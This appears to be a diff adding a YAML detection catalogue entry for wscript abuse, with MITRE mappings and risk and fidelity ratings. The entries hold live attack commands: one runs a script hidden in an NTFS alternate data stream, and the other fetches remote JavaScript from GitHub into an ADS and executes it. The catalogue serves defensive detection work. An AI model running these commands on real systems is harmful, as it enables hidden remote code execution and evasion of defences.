@@ -1,0 +1,46 @@
+- command: wscript c:\ads\file.txt:script.vbs
+  description: Execute a VBS script stored in the Alternate Data Stream (ADS) of another file.
+  killchain:
+    - Actions on Objectives
+  mitre:
+    Defense Evasion:
+      - T1564.004
+    Execution:
+      - T1059.005
+  os:
+    - Windows
+  references:
+    - https://lolbas-project.github.io/lolbas/Binaries/Wscript/
+    - https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f
+  risk: High
+  risk_reason: WScript usage can be common but it's use with an ADS is typically suspicious.
+  fidelity: High
+  fidelity_reason: WScript interaction with an ADS is typically a rare event.
+  tool: wscript
+  threatactors:
+    N/A:
+      - N/A
+- command: echo GetObject("script:https://raw.githubusercontent.com/sailay1996/misc-bin/master/calc.js") > %temp%\test.txt:hi.js && wscript.exe %temp%\test.txt:hi.js
+  description: Download and execute a remote script via wscript.
+  killchain:
+    - Actions on Objectives
+  mitre:
+    Defense Evasion:
+      - T1564.004
+    Execution:
+      - T1059.005
+    Command and Control:
+      - T1105
+  os:
+    - Windows
+  references:
+    - https://lolbas-project.github.io/lolbas/Binaries/Wscript/
+    - https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f
+  risk: High
+  risk_reason: WScript usage can be common but it's use with a remote payload is typically suspicious.
+  fidelity: High
+  fidelity_reason: WScript interaction with remotely hosted payloads is typically a rare event.
+  tool: wscript
+  threatactors:
+    N/A:
+      - N/A
